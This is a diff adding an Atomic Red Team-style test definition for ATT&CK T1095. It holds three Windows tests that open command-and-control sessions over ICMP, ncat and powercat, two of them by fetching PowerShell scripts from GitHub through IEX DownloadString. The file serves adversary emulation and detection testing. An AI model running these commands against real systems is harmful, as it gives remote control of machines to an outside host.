@@ -1,0 +1,88 @@
+attack_technique: T1095
+display_name: Non-Application Layer Protocol
+atomic_tests:
+- name: ICMP C2
+  auto_generated_guid: 0268e63c-e244-42db-bef7-72a9e59fc1fc
+  description: |
+    This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+    refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
+  supported_platforms:
+  - windows
+  input_arguments:
+    server_ip:
+      description: The IP address of the listening server
+      type: string
+      default: 127.0.0.1
+  executor:
+    command: |
+      IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+      Invoke-PowerShellIcmp -IPAddress #{server_ip}
+    name: powershell
+- name: Netcat C2
+  auto_generated_guid: bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37 
+  description: |
+    Start C2 Session Using Ncat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
+  supported_platforms:
+  - windows
+  input_arguments:
+    server_port:
+      description: The port for the C2 connection
+      type: integer
+      default: "80"
+    ncat_exe:
+      description: The location of ncat.exe
+      type: path
+      default: $env:TEMP\T1095\nmap-7.80\ncat.exe
+    ncat_path:
+      description: The folder path of ncat.exe
+      type: path
+      default: $env:TEMP\T1095
+    server_ip:
+      description: The IP address or domain name of the listening server
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ncat.exe must be available at specified location (#{ncat_exe})
+    prereq_command: |
+      if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null
+      $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
+      Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
+        Expand-Archive $zippath $parentpath -Force
+        $unzipPath = Join-Path $parentPath "nmap-7.80"
+      if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
+        Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
+      }
+  executor:
+    command: |
+      cmd /c #{ncat_exe} #{server_ip} #{server_port}
+    name: powershell
+- name: Powercat C2
+  auto_generated_guid: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
+  description: |
+    Start C2 Session Using Powercat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
+  supported_platforms:
+  - windows
+  input_arguments:
+    server_ip:
+      description: The IP address or domain name of the listening server
+      type: string
+      default: 127.0.0.1
+    server_port:
+      description: The port for the C2 connection
+      type: integer
+      default: "80"
+  executor:
+    command: |
+      IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+      powercat -c #{server_ip} -p #{server_port}
+    name: powershell
+
